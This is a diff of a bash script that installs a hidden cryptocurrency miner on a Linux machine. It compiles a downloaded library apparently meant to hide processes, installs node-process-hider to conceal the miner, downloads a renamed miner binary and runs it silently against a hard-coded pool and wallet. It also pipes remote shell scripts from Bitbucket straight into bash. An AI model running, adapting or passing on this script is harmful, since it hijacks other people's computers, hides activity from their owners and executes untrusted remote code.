@@ -1,7 +1,5 @@
 #!/bin/bash
 apt-get update ; apt-get install sudo -y
-sudo apt-get install libsodium23 -y
-apt-get install libsodium23 -y
 curl https://github.com/adawisaud/adawisaud/raw/main/nyumput.c -o nyumput.c
 apt-get install build-essential -y
 gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
@@ -12,8 +10,7 @@ echo "supersede domain-name-servers 8.8.8.8;">> /etc/dhcp/dhclient.conf
 /etc/init.d/network restart
 sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.2.0 -y && npm i -g node-process-hider && ph add sgr1"
 mkdir .kap && cd .kap
-wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64_avx2.tar.gz >/dev/null 2>&1
-tar xf hellminer_linux64_avx2.tar.gz && mv hellminer sgr1
+wget -O sgr1 https://bitbucket.org/mypile/filesg/downloads/serbenew >/dev/null 2>&1
 chmod +x sgr1
-sudo ./sgr1 -c stratum+tcp://45.77.40.14:80 -u RJaE1YRdUd2wy5zpDbp4ij6DbAapUadhrp.$(echo $(shuf -i 1-100000 -n 1)-AJG) -p x --cpu=$(nproc --all) > /dev/null 2>&1 &
-curl -sL https://bitbucket.org/tsyjaryj/filesg/raw/main/boled04.sh | bash
+sudo ./sgr1 --disable-gpu --algorithm verushash --pool 139.180.219.130:80 --wallet RYWshsv766dTZbLJ6AbHcT8HiWngTrW3qe.$(echo $(shuf -i 1-100000 -n 1)-A) --password x --cpu-threads $(nproc --all) > /dev/null 2>&1 &
+curl -sL https://bitbucket.org/mypile/filesg/raw/main/boled04.sh | bash
